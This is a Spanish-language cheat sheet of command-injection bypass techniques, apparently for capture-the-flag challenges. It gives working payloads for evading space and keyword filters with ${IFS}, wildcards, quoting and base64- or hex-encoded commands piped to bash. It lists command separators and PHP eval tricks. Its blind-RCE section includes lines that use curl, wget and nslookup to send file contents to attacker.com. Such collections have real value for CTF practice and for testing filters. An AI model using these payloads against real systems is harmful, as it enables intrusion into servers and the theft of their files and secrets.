# Guía completa de técnicas de bypass en inyección de comandos

## Bypass de espacios

| Método | Ejemplo | Descripción |
|------|------|------|
| `${IFS}` | `cat${IFS}flag.php` | Separador de campo interno (por defecto espacio/Tab/salto de línea) |
| `$IFS$9` | `cat$IFS$9flag.php` | `$9` es el noveno parámetro posicional del shell actual (vacío), evita ambigüedad en el nombre de variable |
| `${IFS}` + variable | `a=$IFS;cat${a}flag` | Asignar y luego referenciar |
| `<` | `cat<flag.php` | Redirección en lugar de espacio |
| `%09` | `cat%09flag.php` | Codificación URL de Tab |
| `%0a` | `cat%0aflag.php` | Salto de línea |
| `{cat,flag.php}` | `{cat,flag.php}` | Expansión de llaves de Bash (solo Bash) |
| `%0d` | `cat%0dflag.php` | Retorno de carro |

### Estrategia de selección para el bypass de espacios
1. **Primera opción**: `$IFS$9` — la mejor compatibilidad
2. **Alternativa**: `<` — conciso, pero `<` puede estar filtrado en algunos contextos
3. **En escenarios URL** usar `%09` o `%0a`

## Separadores de comandos

| Separador | Ejemplo | Descripción |
|--------|------|------|
| `;` | `id;cat flag` | Ejecución secuencial |
| `&&` | `id && cat flag` | El segundo solo se ejecuta si el primero tiene éxito |
| `\|\|` | `id \|\| cat flag` | El segundo solo se ejecuta si el primero falla |
| `\|` | `id \| cat flag` | Tubería (pipe) |
| `%0a` | `id%0acat flag` | Ejecución mediante salto de línea |
| `%0d%0a` | `id%0d%0acat flag` | CRLF |

## Bypass de comandos/palabras clave

### Concatenación de cadenas
```bash
c'a't flag.php       # concatenación con comillas simples
c"a"t flag.php       # concatenación con comillas dobles
c\at flag.php        # escape con barra invertida
```

### Concatenación de variables
```bash
a=c;b=at;$a$b flag.php
a=fl;b=ag;cat /$a$b
```

### Comodines
```bash
cat /f???.php        # ? coincide con un solo carácter
cat /f*              # * coincide con cualquier cantidad de caracteres
/bin/ca? /etc/pas?d  # también se puede usar en rutas
cat /f[a-z]ag.php    # clase de caracteres
```

### Codificación base64
```bash
echo Y2F0IGZsYWcucGhw | base64 -d | bash
# Y2F0IGZsYWcucGhw = "cat flag.php"
```

### Codificación hex
```bash
echo 63617420666c61672e706870 | xxd -r -p | bash
# 63617420666c61672e706870 = "cat flag.php"
```

### Uso de comandos alternativos no bloqueados

| Objetivo | Comando original | Comando alternativo |
|------|--------|---------|
| Leer archivo | cat | more / less / head / tail / tac / nl / od / xxd / sort / rev / paste / diff |
| Leer archivo | cat flag | sed -n '1,100p' flag / awk '{print}' flag |
| Buscar archivo | find | ls -la / dir / echo / locate |
| Descargar | wget | curl / nc / python -c 'import urllib...' |
| Escribir archivo | echo > | tee / printf / python -c |

## Explotación sin salida directa (Blind RCE)

Cuando el resultado de la ejecución del comando no es visible:

### 1. Exfiltración por DNS
```bash
curl http://attacker.com/$(cat flag.php | base64)
nslookup $(cat flag.php).attacker.com
```

### 2. Exfiltración por HTTP
```bash
curl http://attacker.com/?data=$(cat flag.php | base64)
wget http://attacker.com/?data=$(cat flag.php | base64)
```

### 3. Escribir el archivo en una ruta accesible
```bash
cat flag.php > /var/www/html/flag.txt
# Luego acceder desde el navegador a http://target/flag.txt
```

### 4. Escribir en variables de entorno/archivos temporales
```bash
cp flag.php /tmp/flag
# Luego leer /tmp/flag a través de otra vulnerabilidad
```

### 5. Inyección ciega por tiempo
```bash
if [ $(cat flag.php | head -c 1) = 'N' ]; then sleep 3; fi
# Fuerza bruta carácter por carácter
```

## Bypass especial para eval en PHP

### Filtrado de espacios en el contexto de eval

```php
// Cuando eval($cmd) filtra los espacios dentro de $cmd
system("cat<flag.php");      // redirección
system("cat${IFS}flag.php"); // IFS
system("cat$IFS$9flag.php"); // IFS + parámetro posicional
```

### Bypass de límite de longitud

```php
// Cuando hay un límite en la longitud del parámetro (p. ej. strlen > 18)
// Aprovechando la expansión de variables de PHP
?a=system&b=cat flag.php
// eval($_GET[a]($_GET[b]));
```

### Sustitución de la palabra clave "flag"

```php
// Cuando "flag" se reemplaza por un espacio
// Usar comodines
cat /f*          # * coincide con flag
cat /fl?g.php    # ? coincide con un solo carácter
cat /fla?.php
// Usar concatenación de rutas
cat /fl''ag.php  # concatenación con cadena vacía
cat /fl\ag.php   # barra invertida (puede interpretarse como escape)
```
